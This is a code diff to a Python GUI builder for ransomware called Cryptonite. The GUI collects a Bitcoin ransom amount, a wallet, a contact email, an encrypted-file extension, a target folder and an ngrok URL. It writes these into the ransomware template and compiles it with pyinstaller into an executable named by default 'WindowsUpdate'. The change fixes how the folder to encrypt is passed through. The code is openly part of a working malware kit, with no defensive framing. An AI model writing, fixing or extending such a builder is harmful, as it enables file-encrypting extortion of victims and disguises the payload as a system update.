@@ -29,7 +29,8 @@ def generate():
         "BTC_AMOUNT": btcm_entry.get(),
         "BTC_WALLET": btcw_entry.get(),
         "EMAIL": email_entry.get(),
-        "EXT": ext_entry.get().replace(".", "")
+        "EXT": ext_entry.get().replace(".", ""),
+        "FOLDER": folder1_entry.get().strip()
     }
     with open("Cryptonite.py", "r") as f:
         text = f.read()
@@ -38,7 +39,7 @@ def generate():
         text = text.replace("BTC_WALLET = \"\"", f"BTC_WALLET = \"{configDict['BTC_WALLET']}\"")
         text = text.replace("EMAIL = \"\"", f"EMAIL = \"{configDict['EMAIL']}\"")
         text = text.replace("EXT = \"\"", f"EXT = \".{configDict['EXT']}\"")
-        text = text.replace("os.walk('./testfolder')", f"os.walk('{folder}')")
+        text = text.replace("os.walk('./testfolder')", f"os.walk('{configDict['FOLDER']}')")
     with open("Cryptonite.py", "w") as f:
         f.write(text)
     os.system(f"pyinstaller --onefile --clean --icon=\".\images\icon.ico\" Cryptonite.py --name {FILE}")
@@ -86,11 +87,11 @@ name_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6"
 name_entry.grid(row = 1, column = 1, sticky = "w", pady = 10, padx = 15)
 name_entry.insert("0", "WindowsUpdate")
 
-folder = tk.Label(master = window, text = "FOLDER TO ENCRYPT: ", font = ("arial", 15), fg = "black", bg = "white")
-folder.grid(row = 2, column = 0, sticky = "e", pady = 10, padx = 15)
-folder_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
-folder_entry.grid(row = 2, column = 1, sticky = "w", pady = 10, padx = 15)
-folder_entry.insert("0", "./testfolder")
+folder1 = tk.Label(master = window, text = "FOLDER TO ENCRYPT: ", font = ("arial", 15), fg = "black", bg = "white")
+folder1.grid(row = 2, column = 0, sticky = "e", pady = 10, padx = 15)
+folder1_entry = tk.Entry(window, font = ("arial", 15), fg = "black", bg = "#C6C6C6")
+folder1_entry.grid(row = 2, column = 1, sticky = "w", pady = 10, padx = 15)
+folder1_entry.insert("0", "./testfolder")
 
 url = tk.Label(master = window, text = "NGROK URL: ", font = ("arial", 15), fg = "black", bg = "white")
 url.grid(row = 3, column = 0, sticky = "e", pady = 10, padx = 15)
